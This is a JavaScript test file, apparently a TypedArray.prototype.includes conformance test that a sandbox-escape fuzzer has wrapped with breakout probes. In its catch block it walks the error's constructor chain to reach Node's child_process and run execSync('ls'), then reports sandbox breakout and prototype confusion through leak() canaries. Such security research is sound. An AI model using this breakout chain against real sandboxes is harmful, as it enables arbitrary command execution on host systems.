try {
    var includes = TypedArray.prototype.includes;
    assert.throws(TypeError, function () {
        includes.call(undefined, 42);
    }, 'this is undefined');
    assert.throws(TypeError, function () {
        includes.call(null, 42);
    }, 'this is null');
    assert.throws(TypeError, function () {
        includes.call(42, 42);
    }, 'this is 42');
    assert.throws(TypeError, function () {
        includes.call('1', 42);
    }, 'this is a string');
    assert.throws(TypeError, function () {
        includes.call(true, 42);
    }, 'this is true');
    assert.throws(TypeError, function () {
        includes.call(false, 42);
    }, 'this is false');
    var s = Symbol('s');
    assert.throws(TypeError, function () {
        includes.call(s, 42);
    }, 'this is a Symbol');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}